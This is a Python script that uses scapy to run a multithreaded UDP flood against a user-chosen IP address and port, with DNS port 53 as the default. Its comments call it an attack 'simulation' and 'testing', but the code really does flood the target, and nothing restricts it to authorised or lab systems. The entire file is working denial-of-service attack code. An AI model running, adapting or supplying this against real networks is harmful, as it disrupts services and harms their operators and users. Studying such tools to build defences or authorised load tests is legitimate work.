import threading
import time
from scapy.all import IP, UDP, send
import sys

def udp_spammer(thread_id, ip, port, packets, delay):
    """
    Sends a stream of UDP packets to a specific target.

    :param thread_id: Identification number of the thread.
    :param ip: The target IP address.
    :param port: The target UDP port (e.g., 53 for DNS).
    :param packets: Number of packets to send in this thread.
    :param delay: Time in seconds to sleep between transmissions.
    :return: None
    """
    print(f"[Thread {thread_id}] Starting UDP injection...")

    for _ in range(packets):
        # Construct a basic UDP packet
        pkt = IP(dst=ip) / UDP(dport=port)
        
        # Send the packet to the network interface
        send(pkt, verbose=False)

        if delay > 0:
            time.sleep(delay)

    print(f"[Thread {thread_id}] Injection finished.")

def run_udp_flood(ip, port, threads, packets, delay):
    """
    Orchestrates a multithreaded UDP Flood attack simulation.

    :param ip: Target destination IP.
    :param port: Target destination port.
    :param threads: Number of concurrent threads to spawn.
    :param packets: Number of packets each thread will send.
    :param delay: Interval between packets.
    :return: None
    """
    print(f"\n[*] Initiating UDP Flood")
    print(f"[*] Target: {ip}:{port}")
    print(f"[*] Configuration: {threads} threads, {packets} packets/thread\n")

    thread_list = []

    for thread_num in range(threads):
        current_thread = threading.Thread(target=udp_spammer, args=(thread_num + 1, ip, port, packets, delay))
        current_thread.start()
        thread_list.append(current_thread)

    # Wait for all threads to complete their task
    for current_thread in thread_list:
        current_thread.join()

    print("\nUDP Flood executed.")

def get_int(prompt, default, minimum=1):
    """
    Captures and validates integer input from the user.

    :param prompt: The message shown to the user.
    :param default: Value returned if input is empty.
    :param minimum: The lowest acceptable integer value.
    :return: A validated integer.
    """
    while True:
        try:
            user_input = input(f"{prompt} (default {default}): ").strip()
            if not user_input:
                return default
            
            val = int(user_input)
            if val >= minimum:
                return val
            
            print(f"[!] Value must be at least {minimum}")

        except ValueError:
            print("[!] Please enter a valid whole number.")

def get_float(prompt, default, minimum=0.0):
    """
    Captures and validates floating-point input from the user.

    :param prompt: The message shown to the user.
    :param default: Value returned if input is empty.
    :param minimum: The lowest acceptable float value.
    :return: A validated float.
    """
    while True:
        try:
            user_input = input(f"{prompt} (default {default}): ").strip()
            if not user_input:
                return default
            
            val = float(user_input)
            if val >= minimum:
                return val
            
            print(f"[!] Value must be at least {minimum}")

        except ValueError:
            print("[!] Please enter a valid decimal number.")

def main():
    """
    Main entry for the UDP Flood Testing.
    """
    try:
        target_ip = input("Target IP [192.168.1.1]: ").strip() or "192.168.1.1"
        target_port = get_int("Target Port", default=53)
        num_threads = get_int("Threads", default=10)
        num_packets = get_int("Packets per thread", default=100)
        delay = get_float("Delay", default=0.0)

        run_udp_flood(target_ip, target_port, num_threads, num_packets, delay)

    except KeyboardInterrupt:
        print("\n[!] Simulation aborted by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()